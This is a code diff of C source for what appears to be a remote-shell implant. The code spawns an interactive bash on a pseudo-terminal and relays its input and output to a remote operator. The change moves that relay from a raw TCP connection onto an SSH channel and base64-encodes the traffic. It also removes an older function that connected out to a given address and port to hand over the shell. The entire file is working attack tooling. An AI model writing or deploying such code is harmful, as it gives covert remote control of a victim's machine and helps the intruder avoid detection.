@@ -1,10 +1,12 @@
 #include "shell.h"
+#include "b64.h"
 
-int shellUnix(int sock){
+int shell_unix(ssh_channel chan){
     int rc = 0;
     printf("Starting shell init\n");
     char *args[] = {"/bin/bash", "-i", NULL};
     char input[150];
+    int sockfd = ssh_get_fd(ssh_channel_get_session(chan));
 
     int fdm = posix_openpt(O_RDWR);
     if(fdm < 0){
@@ -39,10 +41,13 @@ int shellUnix(int sock){
         {
             // Wait for data from standard input and master side of PTY
             FD_ZERO(&fd_in);
-            FD_SET(sock, &fd_in);
+            FD_SET(sockfd, &fd_in);
             FD_SET(fdm, &fd_in);
 
             rc = select(fdm + 1, &fd_in, NULL, NULL, NULL);
+            int sz = 0;
+            char inp_buff[BUFSIZ];
+            memset(inp_buff, 0, sizeof(inp_buff));
             switch(rc)
             {
                 case -1 : fprintf(stderr, "Error %d on select()\n", errno);
@@ -51,14 +56,22 @@ int shellUnix(int sock){
                 default :
                 {
                     // If data on standard input
-                    if (FD_ISSET(sock, &fd_in))
+                    if (FD_ISSET(sockfd, &fd_in))
                     {
-                        rc = read(sock, input, sizeof(input));
+                        
+                        rc = ssh_channel_read(chan, input, sizeof(input), 0);
+                        
                         if (rc > 0)
                         {
                             // Send data on the master side of PTY
                             //write(sock, input, rc);
-                            write(fdm, input, rc);
+                            sz = b64_decoded_size(input);
+                            rc = b64_decode(input, inp_buff, sz);
+                            if(rc != 0){
+                                write(fdm, inp_buff, sz);
+                            }
+                        
+                            
                         }
                         else
                         {
@@ -76,8 +89,13 @@ int shellUnix(int sock){
                         rc = read(fdm, input, sizeof(input));
                         if (rc > 0)
                         {
+                            sz = b64_encoded_size(rc);
+                            rc = b64_encode(input, inp_buff);
+                            if(rc != 0){
+                                ssh_channel_write(chan, inp_buff, sz);
+                            }
                             // Send data on standard output
-                            write(sock, input, rc);
+                            
                         }
                         else
                         {
@@ -142,41 +160,3 @@ int shellUnix(int sock){
     return 0;
 }
 
-
-int init_shell(char *addr, int port){
-    int sock;
-    struct sockaddr_in serv_addr;
-    char buff[4096];
-    char recvbuff[4096];
-    
-    // Zero out buffers
-    memset(buff, 0, sizeof(buff));
-    memset(recvbuff, 0, sizeof(recvbuff));
-
-
-    // Initialize the socket (and its corresponding fd)
-    if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){
-        printf("Socket failed creation\n");
-        return -1;
-    }
-
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(port);
-
-    if(inet_pton(AF_INET, addr, &serv_addr.sin_addr)<=0){
-        printf("Failed to resolve the address\n");
-        return -1;
-    }
-
-    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0)
-    {
-        printf("Failed to connect to the server\n");
-        return -1;
-    }
-
-
-
-    // creates child process
-    shellUnix(sock);
-    return 0;
-}
